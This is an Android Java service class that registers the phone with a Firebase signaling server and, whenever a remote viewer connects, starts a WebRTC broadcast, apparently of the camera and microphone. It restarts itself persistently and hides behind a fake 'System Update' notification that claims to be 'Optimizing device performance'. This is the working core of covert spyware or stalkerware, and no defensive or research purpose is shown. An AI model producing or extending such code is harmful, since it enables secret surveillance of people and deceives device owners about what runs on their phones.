package com.broadcaster;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_ID = "SystemUpdateChannel";
    private static final int NOTIFICATION_ID = 1001;
    
    private WebRTCManager webRTCManager;
    private FirebaseSignalingClient signalingClient;
    private boolean isStreaming = false;
    private String deviceId;
    
    // Singleton instance for access from WebRTCManager
    private static BackgroundService instance;
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize WebRTC Manager
        webRTCManager = new WebRTCManager(this);
        
        // Initialize Firebase Signaling
        signalingClient = new FirebaseSignalingClient();
        
        // Generate unique device ID
        deviceId = "device_" + System.currentTimeMillis();
        signalingClient.registerBroadcaster(deviceId);
        
        // Set up WebRTC callback for when PeerConnection is created
        webRTCManager.setPeerConnectionCreatedCallback(peerConnection -> {
            if (signalingClient != null) {
                signalingClient.setPeerConnection(peerConnection);
            }
        });
        
        // Set up callback for when local offer is created
        webRTCManager.setOfferCreatedCallback(offer -> {
            if (signalingClient != null) {
                signalingClient.sendOffer(offer);
            }
        });
        
        // Set up callback for when ICE candidate is created
        webRTCManager.setIceCandidateCreatedCallback(candidate -> {
            if (signalingClient != null && isStreaming) {
                signalingClient.sendIceCandidate(candidate);
            }
        });
        
        // Listen for viewer connection
        signalingClient.setOnViewerConnected(() -> {
            Log.d(TAG, "Viewer connected - Starting stream");
            if (!isStreaming) {
                webRTCManager.startBroadcasting();
                isStreaming = true;
            }
        });
        
        // Listen for viewer disconnection
        signalingClient.setOnViewerDisconnected(() -> {
            Log.d(TAG, "Viewer disconnected - Stopping stream");
            if (isStreaming) {
                webRTCManager.stopBroadcasting();
                isStreaming = false;
            }
        });
        
        Log.d(TAG, "Service started - Idle mode (Camera/Mic OFF)");
        Log.d(TAG, "Device ID: " + deviceId);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        instance = null;
        
        // Stop streaming if active
        if (isStreaming) {
            webRTCManager.stopBroadcasting();
        }
        
        // Unregister from Firebase
        if (signalingClient != null) {
            signalingClient.unregisterBroadcaster();
        }
        
        // Clean up WebRTC
        if (webRTCManager != null) {
            webRTCManager.close();
        }
        
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Device optimization running");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Optimizing device performance")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }
    
    // Static methods for accessing from other classes
    public static BackgroundService getInstance() {
        return instance;
    }
    
    public FirebaseSignalingClient getSignalingClient() {
        return signalingClient;
    }
    
    public WebRTCManager getWebRTCManager() {
        return webRTCManager;
    }
    
    public boolean isStreaming() {
        return isStreaming;
    }
    
    public String getDeviceId() {
        return deviceId;
    }
}